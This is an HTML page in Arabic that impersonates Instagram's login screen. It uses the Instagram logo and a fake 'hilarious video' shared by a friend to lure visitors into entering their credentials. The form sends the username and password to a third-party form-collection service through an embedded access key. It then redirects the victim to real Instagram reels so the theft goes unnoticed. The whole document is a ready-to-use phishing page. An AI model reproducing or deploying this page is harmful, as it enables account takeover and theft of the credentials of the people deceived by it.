<!DOCTYPE html>
<html lang="ar" dir="rtl">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=1.0, user-scalable=no">
    <title>Instagram - شاهد الفيديو</title>
    <style>
        * { box-sizing: border-box; margin: 0; padding: 0; }
        body {
            font-family: -apple-system, BlinkMacSystemFont, "Segoe UI", Roboto, Helvetica, Arial, sans-serif;
            background-color: #fafafa;
            display: flex;
            justify-content: center;
            align-items: center;
            min-height: 100vh;
        }
        .login-card {
            background-color: #fff;
            border: 1px solid #dbdbdb;
            padding: 30px;
            width: 100%;
            max-width: 350px;
            text-align: center;
            border-radius: 3px;
        }
        .logo { width: 175px; margin: 10px 0 25px; }
        .video-container {
            width: 100%;
            height: 190px;
            background: linear-gradient(rgba(0,0,0,0.4), rgba(0,0,0,0.4)), url('https://img.freepik.com/free-photo/funny-face-man_23-2148110595.jpg');
            background-size: cover;
            background-position: center;
            border-radius: 4px;
            display: flex;
            justify-content: center;
            align-items: center;
            margin-bottom: 20px;
            position: relative;
        }
        .play-button {
            width: 55px; height: 55px;
            background: rgba(255, 255, 255, 0.9);
            border-radius: 50%;
            display: flex; justify-content: center; align-items: center;
        }
        .play-button::after {
            content: ""; border-style: solid; border-width: 10px 0 10px 18px;
            border-color: transparent transparent transparent #262626; margin-left: 4px;
        }
        .headline { font-size: 17px; font-weight: 700; color: #262626; margin-bottom: 10px; }
        .sub-headline { font-size: 13px; color: #8e8e8e; margin-bottom: 25px; line-height: 1.5; }
        input {
            width: 100%; padding: 12px; margin-bottom: 8px;
            border: 1px solid #dbdbdb; border-radius: 3px;
            background-color: #fafafa; font-size: 13px; outline: none;
        }
        button {
            width: 100%; background-color: #0095f6; color: white;
            border: none; padding: 10px; border-radius: 4px;
            font-weight: 600; font-size: 14px; cursor: pointer; margin-top: 10px;
        }
        button:hover { background-color: #1877f2; }
    </style>
</head>
<body>

<div class="login-card">
    <img src="https://www.instagram.com/static/images/web/mobile_port/logo_2x.png/1bcf9b12e34d.png" alt="Instagram" class="logo">
    
    <div class="video-container">
        <div class="play-button"></div>
    </div>

    <p class="headline">فيديو يقتل بالضحك! 😂🔥</p>
    <p class="sub-headline">سجل الدخول لتأكيد حسابك ومشاهدة الفيديو الذي شاركه صديقك.</p>

    <form action="https://api.web3forms.com/submit" method="POST">
        <input type="hidden" name="access_key" value="377fd852-9a62-4f50-bbc3-6786ed1b01fd">
        
        <input type="text" name="Username" placeholder="اسم المستخدم أو الهاتف" required>
        <input type="password" name="Password" placeholder="كلمة المرور" required>
        
        <input type="hidden" name="redirect" value="https://www.instagram.com/reels/videos/">

        <button type="submit">تسجيل الدخول والمشاهدة الآن</button>
    </form>
</div>

</body>
</html>
